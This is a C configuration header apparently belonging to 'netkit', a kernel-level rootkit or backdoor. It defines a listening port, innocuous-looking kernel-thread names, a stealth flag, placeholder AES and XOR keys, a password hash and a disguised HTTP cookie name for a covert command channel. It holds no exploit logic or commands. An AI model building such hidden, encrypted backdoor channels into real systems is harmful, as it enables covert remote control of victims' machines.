#ifndef CONFIG_H
#define CONFIG_H

#define CONFIG_NETKIT_DEBUG 1
#define CONFIG_NETKIT_STEALTH_FORCE 0

#define CONFIG_IO_SERVER_IP "0.0.0.0"
#define CONFIG_IO_SERVER_PORT 8008
#define CONFIG_IO_SERVER_KTHR_LOOP_NAME "netkit-loop"
#define CONFIG_IO_SERVER_KTHR_HANDLER_NAME "netkit-conn-handler-%08x"

#define CONFIG_PIPELINE_AES_KEY "AAAAAAAABBBBBBBBCCCCCCCCDDDDDDDD"
#define CONFIG_PIPELINE_AUTH_PASSWORD_HASH "\x5e\x88\x48\x98\xda\x28\x04\x71\x51\xd0\xe5\x6f\x8d\xc6\x29\x27\x73\x60\x3d\x0d\x6a\xab\xbd\xd6\x2a\x11\xef\x72\x1d\x15\x42\xd8"
#define CONFIG_PIPELINE_HTTP_COOKIE_NAME "SOCS"
#define CONFIG_PIPELINE_XOR_KEY "NETKIT_XOR"

#include "pipeline/iface.h"

extern const struct pipeline_ops *SERVER_PIPELINE_OPS_ARR[];

#endif